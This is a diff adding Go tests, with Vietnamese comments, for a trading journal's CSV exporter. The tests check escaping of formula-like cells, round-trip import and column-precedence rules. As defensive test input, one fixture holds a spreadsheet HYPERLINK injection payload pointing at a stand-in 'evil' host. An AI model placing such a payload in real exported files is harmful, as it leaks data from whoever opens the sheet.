@@ -228,3 +228,162 @@ func TestWriteCSVRoundTripQuaImporter(t *testing.T) {
 		}
 	}
 }
+
+// Notes và Setup là chữ người dùng gõ tự do. Excel/Sheets chạy ô bắt đầu bằng
+// = + - @ như CÔNG THỨC lúc mở file, nên =HYPERLINK("http://evil/"&A1) trong
+// một note sẽ tự chạy trên máy người mở. File nhật ký hay được gửi đi (kế
+// toán, quỹ, coach) nên đây không phải rủi ro tự hại.
+func TestWriteCSVBocOChuKhoiThanhCongThuc(t *testing.T) {
+	lenh := lenhMau()
+	lenh[0].Notes = `=HYPERLINK("http://evil/"&A1,"click")`
+	lenh[0].Setup = "+1234"
+	lenh[0].Symbol = "@SUM(A1)"
+
+	_, recs := xuat(t, lenh)
+	h, d := recs[0], recs[1]
+	o := func(cot string) string {
+		for i, ten := range h {
+			if ten == cot {
+				return d[i]
+			}
+		}
+		t.Fatalf("không có cột %q", cot)
+		return ""
+	}
+
+	require.Equal(t, `'=HYPERLINK("http://evil/"&A1,"click")`, o("Notes"))
+	require.Equal(t, "'+1234", o("Setup"))
+	require.Equal(t, "'@SUM(A1)", o("Symbol"))
+}
+
+// Mặt kia của cùng một quyết định: cột SỐ không được bọc. "-205" ở Profit là
+// số âm hợp lệ chứ không phải công thức — bọc nó là phá round-trip, và hai
+// yêu cầu này kéo ngược nhau nên phải ghim cả hai trong cùng một file test.
+func TestWriteCSVKhongBocCotSoAm(t *testing.T) {
+	_, recs := xuat(t, lenhMau())
+	h := recs[0]
+	o := func(dong int, cot string) string {
+		for i, ten := range h {
+			if ten == cot {
+				return recs[dong][i]
+			}
+		}
+		t.Fatalf("không có cột %q", cot)
+		return ""
+	}
+	require.Equal(t, "-200", o(2, "Profit"), "số âm giữ nguyên, không có nháy dẫn đầu")
+	require.Equal(t, "-205", o(2, "Profit (đã trừ phí)"))
+}
+
+// Bọc chỉ đúng nếu importer gỡ lại được: nếu không, mỗi vòng xuất-rồi-nhập
+// đội thêm một dấu nháy và note của người dùng trôi dần.
+func TestWriteCSVRoundTripGiuNguyenChuCoKyTuCongThuc(t *testing.T) {
+	lenh := lenhMau()
+	lenh[0].Notes = "=1+1"
+	lenh[0].Setup = "-breakout"
+
+	var buf bytes.Buffer
+	e, err := metrics.Enrich(lenh, accMau())
+	require.NoError(t, err)
+	require.NoError(t, exporter.WriteCSV(&buf, e))
+
+	loc, err := time.LoadLocation("Asia/Ho_Chi_Minh")
+	require.NoError(t, err)
+	rep, err := importer.Parse(bytes.NewReader(buf.Bytes()), loc)
+	require.NoError(t, err)
+	require.Empty(t, rep.Errors)
+
+	require.Equal(t, "=1+1", rep.Rows[0].Notes, "nhập lại phải ra đúng chuỗi gốc")
+	require.Equal(t, "-breakout", rep.Rows[0].Setup)
+}
+
+// Round-trip đứng được nhờ HAI lớp, và test này ghim cả hai.
+//
+// Lớp 1: không tên cột derived nào trùng alias của một cột input. Mong manh —
+// "Loại lệnh" chỉ cách họ "Vào lệnh"/"Trong lệnh"/"Thoát lệnh" một lần đổi
+// tên, còn nhóm "Điểm *" an toàn chỉ nhờ tiền tố "Điểm ".
+//
+// Lớp 2: khi VẪN trùng, nhanDienCot giữ cột TRÁI NHẤT. Mọi cột input đều nằm
+// trong 18 cột đầu, mọi cột derived nằm sau, nên cột thật luôn thắng. Đây mới
+// là lớp thực sự đỡ đòn, và nó chỉ đúng chừng nào thứ tự cột còn giữ nguyên.
+//
+// Test kiểm bằng hành vi: nhồi giá trị nhận ra được vào TẤT CẢ cột derived rồi
+// đòi lệnh nhập về phải sạch bóng chúng.
+func TestKhongCotDerivedNaoBiDocThanhCotInput(t *testing.T) {
+	batBuoc := map[string]bool{"Day": true, "Symbol": true, "Long/ Short": true, "Profit": true}
+
+	// 18 cột đầu là input (theo §0), phần còn lại là derived. Chỉ nhồi rác vào
+	// phần derived — nhồi cả vào cột input thì test chỉ đang kiểm parse lỗi.
+	const soCotInput = 18
+
+	var cot, o []string
+	for i, ten := range exporter.Header() {
+		cot = append(cot, ten)
+		switch {
+		case ten == "Day":
+			o = append(o, "2026-06-09")
+		case ten == "Symbol":
+			o = append(o, "XAUUSD")
+		case ten == "Long/ Short":
+			o = append(o, "BUY")
+		case ten == "Profit":
+			o = append(o, "500")
+		case i < soCotInput:
+			o = append(o, "") // cột input còn lại: để rỗng, hợp lệ
+		default:
+			// Chuỗi này không hợp lệ với BẤT KỲ cột input nào: không phải số,
+			// không phải enum, không phải ngày. Nếu nó lọt vào một ô input thì
+			// hoặc parse lỗi, hoặc hiện ra ở Setup/Notes — cả hai đều đỏ.
+			o = append(o, "DERIVED_"+ten)
+		}
+	}
+	require.Subset(t, cot, []string{"Day", "Symbol", "Long/ Short", "Profit"})
+
+	var b strings.Builder
+	w := csv.NewWriter(&b)
+	require.NoError(t, w.Write(cot))
+	require.NoError(t, w.Write(o))
+	w.Flush()
+	require.NoError(t, w.Error())
+
+	loc, err := time.LoadLocation("Asia/Ho_Chi_Minh")
+	require.NoError(t, err)
+	rep, err := importer.Parse(strings.NewReader(b.String()), loc)
+	require.NoError(t, err)
+	require.Empty(t, rep.Errors, "cột derived phải bị bỏ qua, không được gây lỗi parse")
+	require.Len(t, rep.Rows, 1)
+
+	t0 := rep.Rows[0]
+	require.NotContains(t, t0.Setup, "DERIVED_")
+	require.NotContains(t, t0.Notes, "DERIVED_")
+	require.NotContains(t, t0.Symbol, "DERIVED_")
+	require.NotContains(t, t0.Timeframe, "DERIVED_")
+	require.NotContains(t, t0.EntryQuality, "DERIVED_")
+	require.NotContains(t, t0.InTradeQuality, "DERIVED_")
+	require.NotContains(t, t0.ExitQuality, "DERIVED_")
+	require.NotContains(t, t0.Psychology, "DERIVED_")
+	require.Equal(t, "500", t0.Profit.String(), "cột input vẫn phải đọc đúng")
+
+	for ten := range batBuoc {
+		require.Contains(t, cot, ten, "header xuất ra phải còn đủ cột input bắt buộc")
+	}
+
+	// Ghim lớp 2 trực tiếp: dựng một file CỐ Ý trùng tên, cột derived đứng
+	// SAU. Cột trái nhất phải thắng. Không có ràng buộc này thì lớp 1 là thứ
+	// duy nhất đỡ, và lớp 1 chỉ là một sự trùng hợp về cách đặt tên.
+	trung := "Day,Symbol,Long/ Short,Profit,Vào lệnh,Vào lệnh\n" +
+		"2026-06-09,XAUUSD,BUY,500," + domain.EntryQualities[0] + ",DERIVED_RAC\n"
+	rep2, err := importer.Parse(strings.NewReader(trung), loc)
+	require.NoError(t, err)
+	require.Empty(t, rep2.Errors, "cột trùng tên bên phải phải bị bỏ qua, không gây lỗi")
+	require.Len(t, rep2.Rows, 1)
+	require.Equal(t, domain.EntryQualities[0], rep2.Rows[0].EntryQuality,
+		"phải lấy cột TRÁI NHẤT; lấy cột phải là đọc giá trị derived vào ô input")
+
+	// Và ghim luôn tiền đề của lớp 2: mọi cột input nằm trước mọi cột derived.
+	for i, ten := range exporter.Header() {
+		if batBuoc[ten] {
+			require.Less(t, i, soCotInput, "cột input %q phải nằm trong %d cột đầu", ten, soCotInput)
+		}
+	}
+}
